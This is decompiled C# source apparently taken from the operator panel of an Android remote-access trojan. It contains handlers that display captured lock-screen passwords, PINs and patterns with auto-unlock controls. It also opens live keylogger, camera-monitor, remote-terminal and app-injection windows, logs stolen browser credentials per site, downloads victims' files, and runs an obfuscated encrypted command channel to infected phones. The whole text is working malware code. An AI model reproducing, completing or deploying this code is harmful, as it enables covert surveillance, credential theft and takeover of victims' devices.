		public _Closure_0024__15_002D4(_Closure_0024__15_002D4 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_lockerform = arg0._0024VB_0024Local_lockerform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_capturelock = arg0._0024VB_0024Local_capturelock;
				_0024VB_0024Local_passcods = arg0._0024VB_0024Local_passcods;
				_0024VB_0024Local_islocked = arg0._0024VB_0024Local_islocked;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__5()
		{
			if (_0024VB_0024Local_lockerform == null)
			{
				_0024VB_0024Local_lockerform = new lockscreen();
				_0024VB_0024Local_lockerform.Tag = "locker" + _0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_mobid;
				_0024VB_0024Local_lockerform.Name = _0024VB_0024Local_handle;
				_0024VB_0024Local_lockerform.BTcli = _0024VB_0024Local_classclient;
				if (_0024VB_0024Local_lockerform.DGV0.Columns["excutclmn"] == null)
				{
					DataGridViewButtonColumn dataGridViewColumn = CreateDgvRunButtonColumn();
					_0024VB_0024Local_lockerform.DGV0.Columns.Add(dataGridViewColumn);
				}
				_0024VB_0024Local_lockerform.Show();
			}
			_0024VB_0024Local_lockerform.DGV0.Rows.Clear();
			if (_0024VB_0024Local_capturelock.Contains(":"))
			{
				string[] array = _0024VB_0024Local_capturelock.Split(":");
				string text = array[0];
				string text2 = array[1];
				switch (text)
				{
				case "pa":
					_0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Password", text2, BTConst.autounlockbtnstr);
					break;
				case "pt":
					_0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Pattern", text2, BTConst.autounlockbtnstr);
					break;
				case "pi":
					_0024VB_0024Local_lockerform.DGV0.Rows.Add("Captured Pin", text2, BTConst.autounlockbtnstr);
					break;
				}
			}
			if (_0024VB_0024Local_passcods.Contains("*"))
			{
				string[] array2 = _0024VB_0024Local_passcods.Split("*");
				foreach (string text3 in array2)
				{
					if (!text3.Contains("|"))
					{
						continue;
					}
					string[] array3 = text3.Split('|');
					if (array3.Length == 2)
					{
						string text4 = array3[0];
						switch (array3[1])
						{
						case "1":
							_0024VB_0024Local_lockerform.DGV0.Rows.Add("Pattern", text4, BTConst.autounlockbtnstr);
							break;
						case "2":
							_0024VB_0024Local_lockerform.DGV0.Rows.Add("Pin", text4, BTConst.autounlockbtnstr);
							break;
						case "3":
							_0024VB_0024Local_lockerform.DGV0.Rows.Add("Password", text4, BTConst.autounlockbtnstr);
							break;
						}
					}
				}
			}
			_0024VB_0024Local_lockerform.switchlock(_0024VB_0024Local_islocked);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D40
	{
		public Bitmap _0024VB_0024Local_imgBitmap;

		public _Closure_0024__15_002D39 _0024VB_0024NonLocal__0024VB_0024Closure_27;

		public _Closure_0024__15_002D40(_Closure_0024__15_002D40 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_imgBitmap = arg0._0024VB_0024Local_imgBitmap;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__35()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_27._0024VB_0024Local_browserform.viewmonitor.Image = _0024VB_0024Local_imgBitmap;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D41
	{
		public Bitmap _0024VB_0024Local_imgBitmap;

		public _Closure_0024__15_002D39 _0024VB_0024NonLocal__0024VB_0024Closure_28;

		public _Closure_0024__15_002D41(_Closure_0024__15_002D41 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_imgBitmap = arg0._0024VB_0024Local_imgBitmap;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__36()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_28._0024VB_0024Local_browserform.viewhidden.Image = _0024VB_0024Local_imgBitmap;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D42
	{
		public List<string> _0024VB_0024Local_listsites;

		public string _0024VB_0024Local_logtext;

		public Dictionary<string, string> _0024VB_0024Local_siteData;

		public _Closure_0024__15_002D39 _0024VB_0024NonLocal__0024VB_0024Closure_29;

		public _Closure_0024__15_002D42(_Closure_0024__15_002D42 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_listsites = arg0._0024VB_0024Local_listsites;
				_0024VB_0024Local_logtext = arg0._0024VB_0024Local_logtext;
				_0024VB_0024Local_siteData = arg0._0024VB_0024Local_siteData;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__37()
		{
			if (_0024VB_0024Local_listsites.Count > 0)
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Enabled = true;
				_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Clear();
				_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Add("All");
				foreach (string item in _0024VB_0024Local_listsites)
				{
					_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Add(item);
				}
			}
			_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Text = "All";
			_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.passtextlog.Text = _0024VB_0024Local_logtext;
			_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.dellall.Enabled = true;
			_0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.SiteData = _0024VB_0024Local_siteData;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D43
	{
		public List<string> _0024VB_0024Local_listsites;

		public string _0024VB_0024Local_logtext;

		public Dictionary<string, string> _0024VB_0024Local_siteData;

		public _Closure_0024__15_002D44 _0024VB_0024NonLocal__0024VB_0024Closure_30;

		public _Closure_0024__15_002D43(_Closure_0024__15_002D43 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_listsites = arg0._0024VB_0024Local_listsites;
				_0024VB_0024Local_logtext = arg0._0024VB_0024Local_logtext;
				_0024VB_0024Local_siteData = arg0._0024VB_0024Local_siteData;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__38()
		{
			if (_0024VB_0024Local_listsites.Count > 0)
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Enabled = true;
				_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Clear();
				_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Add("All");
				foreach (string item in _0024VB_0024Local_listsites)
				{
					_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Add(item);
				}
			}
			_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.passtextlog.Text = _0024VB_0024Local_logtext;
			_0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.SiteData = _0024VB_0024Local_siteData;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D44
	{
		public Tracker _0024VB_0024Local_trackform;

		public _Closure_0024__15_002D44(_Closure_0024__15_002D44 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_trackform = arg0._0024VB_0024Local_trackform;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D45
	{
		public LiveKeylogger _0024VB_0024Local_keylogform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D45(_Closure_0024__15_002D45 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_keylogform = arg0._0024VB_0024Local_keylogform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D46
	{
		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D45 _0024VB_0024NonLocal__0024VB_0024Closure_31;

		public _Closure_0024__15_002D46(_Closure_0024__15_002D46 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__39()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform = new LiveKeylogger();
			_0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D47
	{
		public CameraMonitor _0024VB_0024Local_camform;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__15_002D47(_Closure_0024__15_002D47 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_camform = arg0._0024VB_0024Local_camform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__41()
		{
			_0024VB_0024Local_camform.baseloader.Enabled = false;
			_0024VB_0024Local_camform.baseloader.Visible = false;
			_0024VB_0024Local_camform.mainstatelabel.Text = BTConst.selectedtypstr + ": " + _0024VB_0024Local_camform.comboTargts.Text + Strings.Space(10) + BTConst.Connectedstr;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D48
	{
		public BTClient _0024VB_0024Local_classclient;

		public string[] _0024VB_0024Local_camsizes;

		public _Closure_0024__15_002D47 _0024VB_0024NonLocal__0024VB_0024Closure_32;

		public _Closure_0024__15_002D48(_Closure_0024__15_002D48 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_camsizes = arg0._0024VB_0024Local_camsizes;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__40()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform = new CameraMonitor();
			_0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_handle;
			_0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Btcli = _0024VB_0024Local_classclient;
			_0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.addsizes(new object[1] { _0024VB_0024Local_camsizes });
			_0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D49
	{
		public filesmanager _0024VB_0024Local_FileManager;

		public List<object[]> _0024VB_0024Local_rowsToAdd;

		public Func<object[], DataGridViewRow> _0024I43;

		public _Closure_0024__15_002D49(_Closure_0024__15_002D49 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_FileManager = arg0._0024VB_0024Local_FileManager;
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__42()
		{
			_0024VB_0024Local_FileManager.DGVFIND.Rows.Clear();
			_0024VB_0024Local_FileManager.DGVFIND.Rows.AddRange(_0024VB_0024Local_rowsToAdd.Select([SpecialName] (object[] r) =>
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.CreateCells(_0024VB_0024Local_FileManager.DGVFIND, r);
				return dataGridViewRow;
			}).ToArray());
		}

		[SpecialName]
		internal DataGridViewRow _Lambda_0024__43(object[] r)
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.CreateCells(_0024VB_0024Local_FileManager.DGVFIND, r);
			return dataGridViewRow;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D5
	{
		public string _0024VB_0024Local_mobid;

		public _Closure_0024__15_002D21 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__15_002D5(_Closure_0024__15_002D5 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_mobid = arg0._0024VB_0024Local_mobid;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D50
	{
		public filesmanager _0024VB_0024Local_FileManager;

		public string _0024VB_0024Local_filename;

		public string _0024VB_0024Local_filepath;

		public long _0024VB_0024Local_totalSize;

		public DataGridViewRow _0024VB_0024Local_rowview;

		public _Closure_0024__15_002D50(_Closure_0024__15_002D50 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_FileManager = arg0._0024VB_0024Local_FileManager;
				_0024VB_0024Local_filename = arg0._0024VB_0024Local_filename;
				_0024VB_0024Local_filepath = arg0._0024VB_0024Local_filepath;
				_0024VB_0024Local_totalSize = arg0._0024VB_0024Local_totalSize;
				_0024VB_0024Local_rowview = arg0._0024VB_0024Local_rowview;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__44()
		{
			int index = _0024VB_0024Local_FileManager.DGVDATA.Rows.Add(_0024VB_0024Local_filename, _0024VB_0024Local_filepath, codes.BytesToText(_0024VB_0024Local_totalSize), BTConst.Downloadingstr, "0%");
			_0024VB_0024Local_rowview = _0024VB_0024Local_FileManager.DGVDATA.Rows[index];
			_0024VB_0024Local_rowview.Tag = _0024VB_0024Local_filepath;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D51
	{
		public vidplayer _0024VB_0024Local_vidp;

		public Bitmap _0024VB_0024Local_imgBitmap;

		public string _0024VB_0024Local_duration;

		public _Closure_0024__15_002D51(_Closure_0024__15_002D51 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_vidp = arg0._0024VB_0024Local_vidp;
				_0024VB_0024Local_imgBitmap = arg0._0024VB_0024Local_imgBitmap;
				_0024VB_0024Local_duration = arg0._0024VB_0024Local_duration;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__48()
		{
			try
			{
				if (_0024VB_0024Local_vidp.viewimage.Image != null)
				{
					_0024VB_0024Local_vidp.viewimage.Image.Dispose();
					_0024VB_0024Local_vidp.viewimage.Image = null;
				}
				_0024VB_0024Local_vidp.viewimage.Image = _0024VB_0024Local_imgBitmap;
				_0024VB_0024Local_vidp.viewimage.SizeMode = PictureBoxSizeMode.StretchImage;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		[SpecialName]
		internal void _Lambda_0024__50()
		{
			_0024VB_0024Local_vidp.durprogress.Value = Math.Min(checked(_0024VB_0024Local_vidp.durprogress.Value + 500), _0024VB_0024Local_vidp.durprogress.Maximum);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D52
	{
		public string _0024VB_0024Local_readableDuration;

		public _Closure_0024__15_002D51 _0024VB_0024NonLocal__0024VB_0024Closure_33;

		public _Closure_0024__15_002D52(_Closure_0024__15_002D52 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_readableDuration = arg0._0024VB_0024Local_readableDuration;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__49()
		{
			checked
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.durprogress.Value++;
				_0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.durprogress.Maximum = Conversions.ToInteger(_0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_duration);
				_0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.Text = _0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.targetfilename + " | " + _0024VB_0024Local_readableDuration;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D53
	{
		public filesmanager _0024VB_0024Local_FileManager;

		public Bitmap _0024VB_0024Local_thumbimg;

		public _Closure_0024__15_002D53(_Closure_0024__15_002D53 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_FileManager = arg0._0024VB_0024Local_FileManager;
				_0024VB_0024Local_thumbimg = arg0._0024VB_0024Local_thumbimg;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__51()
		{
			if (_0024VB_0024Local_FileManager.viwimage.Image != null)
			{
				_0024VB_0024Local_FileManager.viwimage.Image.Dispose();
				_0024VB_0024Local_FileManager.viwimage.Image = null;
			}
			_0024VB_0024Local_FileManager.viwimage.Image = _0024VB_0024Local_thumbimg;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D6
	{
		public injections _0024VB_0024Local_jectform;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public JArray _0024VB_0024Local_jsonArray;

		public _Closure_0024__15_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_5;

		public _Closure_0024__15_002D6(_Closure_0024__15_002D6 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_jectform = arg0._0024VB_0024Local_jectform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
				_0024VB_0024Local_jsonArray = arg0._0024VB_0024Local_jsonArray;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__6()
		{
			if (_0024VB_0024Local_jectform == null)
			{
				_0024VB_0024Local_jectform = new injections();
				_0024VB_0024Local_jectform.Tag = "jections" + _0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024Local_mobid;
				_0024VB_0024Local_jectform.Name = _0024VB_0024Local_handle;
				_0024VB_0024Local_jectform.myico.Image = _0024VB_0024Local_classclient.wallpaper;
				_0024VB_0024Local_jectform.mytitle.Text = BTConst.injctstr + " | " + _0024VB_0024Local_classclient.name + " | " + _0024VB_0024Local_classclient.country;
				_0024VB_0024Local_jectform.Show();
			}
			foreach (JObject item in _0024VB_0024Local_jsonArray)
			{
				string text = item["appId"].ToString();
				_0024VB_0024Local_jectform.combojects.Items.Add(text);
				JToken jToken = item["data"];
				string text2 = "";
				if (jToken is JArray)
				{
					foreach (JToken item2 in (IEnumerable<JToken>)jToken)
					{
						string text3 = (string?)item2;
						text2 = text2 + " - " + text3 + "\r\n";
					}
				}
				else
				{
					text2 = text2 + " - " + jToken.ToString() + "\r\n";
				}
				_0024VB_0024Local_jectform.jectlist.Add(text, text2);
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D7
	{
		public terminal _0024VB_0024Local_terminalform;

		public string _0024VB_0024Local_handle;

		public BTClient _0024VB_0024Local_classclient;

		public _Closure_0024__15_002D7(_Closure_0024__15_002D7 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_terminalform = arg0._0024VB_0024Local_terminalform;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				_0024VB_0024Local_classclient = arg0._0024VB_0024Local_classclient;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D8
	{
		public string _0024VB_0024Local_andver;

		public string _0024VB_0024Local_termtype;

		public _Closure_0024__15_002D7 _0024VB_0024NonLocal__0024VB_0024Closure_6;

		public _Closure_0024__15_002D8(_Closure_0024__15_002D8 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_andver = arg0._0024VB_0024Local_andver;
				_0024VB_0024Local_termtype = arg0._0024VB_0024Local_termtype;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__7()
		{
			if (_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform == null)
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform = new terminal();
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.Name = _0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_handle;
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.androidver = _0024VB_0024Local_andver;
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.mytype = _0024VB_0024Local_termtype;
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.BTcli = _0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_classclient;
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_terminalform.Show();
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__15_002D9
	{
		public string _0024VB_0024Local_response;

		public _Closure_0024__15_002D7 _0024VB_0024NonLocal__0024VB_0024Closure_7;

		public _Closure_0024__15_002D9(_Closure_0024__15_002D9 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_response = arg0._0024VB_0024Local_response;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__8()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_terminalform.printterminal(_0024VB_0024Local_response);
		}
	}

	public static Form1 MainForm;

	public static List<string> BlockedClients = new List<string>();

	public static Dictionary<string, BTClient> clients = new Dictionary<string, BTClient>();

	public static Dictionary<string, SecureClientInfo> SecureClients = new Dictionary<string, SecureClientInfo>();

	public static List<string> unkownkeys = new List<string>();

	public static GeoIP GeoIP0 = new GeoIP(MyRes.GEOIP_Path);

	public static readonly object lockadd = RuntimeHelpers.GetObjectValue(new object());

	public static readonly object AddLock = RuntimeHelpers.GetObjectValue(new object());

	public static object SocketsCount = 0;

	public static bool isblocked(object iporid)
	{
		if (BlockedClients.Contains(Conversions.ToString(iporid)))
		{
			return true;
		}
		return false;
	}

	public static void commandsleep(string mobid, ServersInfo srverinf)
	{
		VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._46392805);
		string value = BTCommand.FormatCommand(EXGuarder._62384D3D, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3668430B, BTConst.wrk);
		dictionary.Add(EXGuarder._7254141E, value);
		Dictionary<string, object> chatData = dictionary;
		commands(chatData, mobid, srverinf.WSClient);
	}

	public static void CommandHandshake(string mobid, ServersInfo srverinf)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._70312E2A, BTConst.revrify);
		Dictionary<string, object> chatData = dictionary;
		commands(chatData, mobid, srverinf.WSClient);
	}

	public static void HandleMessage(string messageJson, ServersInfo srverinf)
	{
		_Closure_0024__15_002D21 arg1 = default(_Closure_0024__15_002D21);
		_Closure_0024__15_002D21 closure_0024__15_002D = new _Closure_0024__15_002D21(arg1);
		closure_0024__15_002D._0024VB_0024Local_srverinf = srverinf;
		checked
		{
			try
			{
				_Closure_0024__15_002D5 arg2 = default(_Closure_0024__15_002D5);
				_Closure_0024__15_002D5 closure_0024__15_002D2 = new _Closure_0024__15_002D5(arg2);
				closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2 = closure_0024__15_002D;
				if (!closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.IsOnline)
				{
					return;
				}
				Dictionary<string, object> dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(messageJson);
				if (dictionary == null)
				{
					Debuger.Log_e(EXGuarder._21137566, EXGuarder._186B141E);
					return;
				}
				string _121E = EXGuarder._121E6943;
				try
				{
					_121E = dictionary[EXGuarder._72385830].ToString();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					_121E = EXGuarder._5567045D;
					ProjectData.ClearProjectError();
				}
				string left = dictionary[EXGuarder._29444245].ToString();
				closure_0024__15_002D2._0024VB_0024Local_mobid = (dictionary.ContainsKey(EXGuarder._79583F6E) ? dictionary[EXGuarder._79583F6E].ToString() : null);
				if (closure_0024__15_002D2._0024VB_0024Local_mobid == null)
				{
					Debuger.Log_e(EXGuarder._21137566, EXGuarder._1D1A2122);
					return;
				}
				string right = (dictionary.ContainsKey(EXGuarder._1A673C39) ? dictionary[EXGuarder._1A673C39].ToString() : EXGuarder._13462F5E);
				if (Operators.CompareString(closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.SCkey, right, TextCompare: false) != 0)
				{
					if (!unkownkeys.Contains(closure_0024__15_002D2._0024VB_0024Local_mobid))
					{
						unkownkeys.Add(closure_0024__15_002D2._0024VB_0024Local_mobid);
						MainForm.LogConnection(BTConst.Blockedstr, codes.connectionicon(EXGuarder._216A7659), _121E, BTConst.unkwnkeystr, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
					}
					commandsleep(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
					return;
				}
				if (isblocked(_121E))
				{
					commandsleep(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
					return;
				}
				if (isblocked(closure_0024__15_002D2._0024VB_0024Local_mobid))
				{
					commandsleep(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
					return;
				}
				Debuger.Log_d(EXGuarder._35441C4A, _121E);
				if (Operators.CompareString(left, EXGuarder._75106764, TextCompare: false) != 0)
				{
					return;
				}
				string value = dictionary[EXGuarder._08033105].ToString();
				Dictionary<string, object> dictionary2 = null;
				try
				{
					dictionary2 = JsonConvert.DeserializeObject<Dictionary<string, object>>(value);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				if (dictionary2 != null && dictionary2.ContainsKey(EXGuarder._29444245) && Operators.CompareString(dictionary2[EXGuarder._29444245].ToString(), EXGuarder._656E4028, TextCompare: false) == 0)
				{
					string text = dictionary2[EXGuarder._08033105].ToString();
					string sigBase = dictionary2[EXGuarder._41341E28].ToString();
					bool flag = true;
					if (dictionary2.ContainsKey(EXGuarder._1A070163))
					{
						flag = Convert.ToBoolean(RuntimeHelpers.GetObjectValue(dictionary2[EXGuarder._1A070163]));
					}
					if (!SecureClients.ContainsKey(closure_0024__15_002D2._0024VB_0024Local_mobid))
					{
						CommandHandshake(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
						return;
					}
					if (!KeyGenerator.VerifyClientSecureMessage(text, sigBase, SecureClients[closure_0024__15_002D2._0024VB_0024Local_mobid].SignPublicKey))
					{
						CommandHandshake(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
						return;
					}
					if (flag)
					{
						try
						{
							value = KeyGenerator.DecryptClientMessage(text, SecureClients[closure_0024__15_002D2._0024VB_0024Local_mobid].SharedSecret);
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							CommandHandshake(closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf);
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						value = Encoding.UTF8.GetString(Convert.FromBase64String(text));
					}
				}
				Dictionary<string, object> dictionary3 = JsonConvert.DeserializeObject<Dictionary<string, object>>(value);
				if (dictionary3 == null)
				{
					return;
				}
				if (dictionary3 == null)
				{
					Debuger.Log_e(EXGuarder._51712B78, EXGuarder._202A6A54);
					return;
				}
				string text2 = dictionary3[EXGuarder._29444245].ToString();
				bool flag2 = dictionary3.ContainsKey(EXGuarder._16553957) && Convert.ToBoolean(RuntimeHelpers.GetObjectValue(dictionary3[EXGuarder._16553957]));
				Debuger.Log_d(EXGuarder._1A58275E, text2);
				string left2 = text2;
				if (Operators.CompareString(left2, BTConst.hellome, TextCompare: false) == 0)
				{
					string text3 = dictionary3[EXGuarder._6F2C3269].ToString();
					BTClient clientById = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
					if (clientById != null)
					{
						clientById.IsSecured = false;
					}
					string text4 = dictionary3[EXGuarder._330B166E].ToString();
					string text5 = dictionary3[EXGuarder._331E1376].ToString();
					string challenge = dictionary3[EXGuarder._710E3863].ToString();
					string signatureBase = dictionary3[EXGuarder._41341E28].ToString();
					if (KeyGenerator.VerifyClientHello(challenge, signatureBase, text4))
					{
						X25519PublicKeyParameters publicKey = new X25519PublicKeyParameters(Convert.FromBase64String(text5), 0);
						X25519PrivateKeyParameters x25519PrivateKeyParameters = new X25519PrivateKeyParameters(KeyGenerator.LoadedExchangePrivateKey, 0);
						byte[] array = new byte[32];
						x25519PrivateKeyParameters.GenerateSecret(publicKey, array, 0);
						if (!SecureClients.ContainsKey(text3))
						{
							SecureClients.Add(text3, new SecureClientInfo
							{
								SignPublicKey = text4,
								ExchangePublicKey = text5,
								SharedSecret = array
							});
						}
						else
						{
							SecureClients[text3].SignPublicKey = text4;
							SecureClients[text3].ExchangePublicKey = text5;
							SecureClients[text3].SharedSecret = array;
						}
						string text6 = Guid.NewGuid().ToString();
						string s = text6 + Convert.ToBase64String(KeyGenerator.LoadedExchangePublicKey);
						Ed25519Signer ed25519Signer = new Ed25519Signer();
						ed25519Signer.Init(forSigning: true, new Ed25519PrivateKeyParameters(KeyGenerator.LoadedSignPrivateKey, 0));
						byte[] bytes = Encoding.UTF8.GetBytes(s);
